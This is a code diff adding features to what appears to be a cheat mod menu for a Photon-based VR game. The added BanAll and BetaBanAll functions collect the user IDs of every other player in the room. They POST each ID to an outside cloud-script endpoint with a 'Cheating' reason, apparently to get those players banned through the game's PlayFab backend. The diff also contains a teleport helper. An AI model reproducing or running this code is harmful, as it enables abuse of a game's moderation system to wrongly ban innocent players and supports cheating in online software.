@@ -140,6 +140,49 @@ namespace JupiterX
             return PhotonNetwork.LocalPlayer;
         }
 
+        public static void BanAll()
+        {
+            Plugin.DoCoroun(BetaBanAllWithDelay());
+
+            if (Utility.RTrigger)
+            {
+                Main.GetIndex("Ban All").enabled = false;
+            }
+        }
+
+        static System.Collections.IEnumerator BetaBanAllWithDelay()
+        {
+            yield return new WaitForSeconds(2);
+            foreach (Photon.Realtime.Player plr in PhotonNetwork.PlayerListOthers)
+            {
+                BetaBanAll(plr.UserId);
+            }
+        }
+
+        public static void BetaBanAll(string userid) // release december 1st 25 -- current date 31/08/2025 releasing today ig
+        {
+            string photonId = userid;
+            string titleId = PlayFabSettings.staticSettings.TitleId;
+            string msg = "Modding";
+            string rsn = "Cheating";
+
+            string url = "https://api-colossal-quest.vercel.app/api/runcloudscript"; // abuse this i will take it down
+
+            WebClient client = new WebClient();
+            try
+            {
+                client.Headers.Add("Content-Type", "application/json");
+                string payload = $"{{\"playerId\":\"{photonId}\", \"titleId\":\"{titleId}\", \"msg\":\"{msg}\", \"rsn\":\"{rsn}\"}}";
+
+                string response = client.UploadString(url, "POST", payload);
+                MelonLoader.MelonLogger.Msg("Cloud Script Response: " + response);
+            }
+            catch (Exception ex)
+            {
+                MelonLoader.MelonLogger.Error("Error sending Cloud Script: " + ex.Message);
+            }
+        }
+
         public static void BetaTPToSling()
         {
             Slingshot slingshot = GorillaTagger.Instance.offlineVRRig.slingshot;
